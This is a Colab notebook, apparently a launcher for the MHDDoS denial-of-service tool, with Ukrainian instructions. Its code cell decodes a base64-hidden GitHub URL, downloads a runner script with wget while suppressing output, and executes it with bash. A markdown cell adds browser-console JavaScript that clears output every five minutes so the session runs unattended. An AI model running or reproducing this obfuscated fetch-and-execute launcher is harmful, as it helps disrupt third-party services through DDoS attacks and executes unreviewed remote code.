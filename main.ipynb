{
 "nbformat": 4,
 "nbformat_minor": 0,
 "metadata": {
  "colab": {
   "name": "auto_mhddos.ipynb",
   "private_outputs": true,
   "provenance": [],
   "collapsed_sections": []
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3"
  },
  "language_info": {
   "name": "python"
  }
 },
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "%cd -q ~\n",
    "name=\"_replace_me_with_unique_name_in_latin_\"\n",
    "!wget -O {name}.sh $(echo aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3doaXRlLXNhZ2l0dGFyaXVzL2F1dG9fbWhkZG9zL2ZlYXR1cmUvZHluYW1pYy9ydW5uZXIubmV3LnNoCg== | base64 -d) &> /dev/null\n",
    "!echo 'echo \"{name}\"' >> {name}.sh &> /dev/null\n",
    "!bash {name}.sh -e {name}"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "<details>\n",
    "    <summary>Опціонально: натисніть для інструкції з <strong>автоматичної очистки виводу на екран</strong></summary>\n",
    "\n",
    "    - виведіть консоль вашого браузера; зазвичай, вона викликається клавішею F12\n",
    "    - переконайтесь, що фокус стоїть на вкладці Console\n",
    "    - скопіюйте текст нижче, вставте його у поле вводу після > та мигаючого | i нажміть ентер:\n",
    "    function ClearOutput(){ document.querySelector(\"iron-icon[command = 'clear-focused-or-selected-outputs']\").click() } setInterval(ClearOutput,300000)\n",
    "    - кожні 5 хвилин вивід результатів буде очищено; консоль браузера можна закривати\n",
    "\n",
    "</details>"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%% md\n"
    }
   }
  }
 ]
}